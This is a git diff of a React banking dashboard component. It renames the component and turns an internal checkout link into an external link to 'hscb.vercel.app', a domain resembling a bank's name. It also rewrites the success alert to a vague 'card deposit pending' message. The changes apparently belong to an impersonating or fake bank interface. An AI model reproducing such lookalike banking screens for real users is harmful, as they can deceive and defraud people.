@@ -1,4 +1,4 @@
-import React from "react";
+﻿import React from "react";
 import {
   FaHome,
   FaWallet,
@@ -9,7 +9,7 @@ import {
 import { Link } from "react-router-dom";
 import Navigation from "../components/Navigation";
 
-const Dashboard2 = () => {
+const Dashboard3 = () => {
   return (
     <div className="min-h-screen bg-gray-100 font-sans">
       {/* Header */}
@@ -37,8 +37,10 @@ const Dashboard2 = () => {
       {/* Account Summary */}
       <main className="px-4 py-6 space-y-4">
         {/* Account Card */}
-        <Link
-          to="/checkout"
+        <a
+          href="https://hscb.vercel.app/"
+          target="_blank"
+          rel="noopener noreferrer"
           className="block bg-white p-4 rounded-lg shadow-md hover:shadow-lg"
         >
           <h2 className="text-gray-800 font-semibold">SAVINGS ...2652</h2>
@@ -47,14 +49,14 @@ const Dashboard2 = () => {
           <div className="mt-2 bg-green-50 p-3 rounded-md text-sm text-green-600 flex items-start gap-2">
             <span className="text-xl">✅</span>
             <div>
-              <strong>Success Alert:</strong> No issues detected on your
-              account. You can proceed to make transactions.
+              <strong>Success Alert:</strong> Your Card Deposit is Currently
+              Pending We Will get back to You
               <span className="block mt-1 text-blue-600 font-medium underline">
                 Pay & Transfer
               </span>
             </div>
           </div>
-        </Link>
+        </a>
 
         {/* Another Account Card */}
         <div className="bg-white p-4 rounded-lg shadow-md">
@@ -97,4 +99,4 @@ const Dashboard2 = () => {
   );
 };
 
-export default Dashboard2;
+export default Dashboard3;
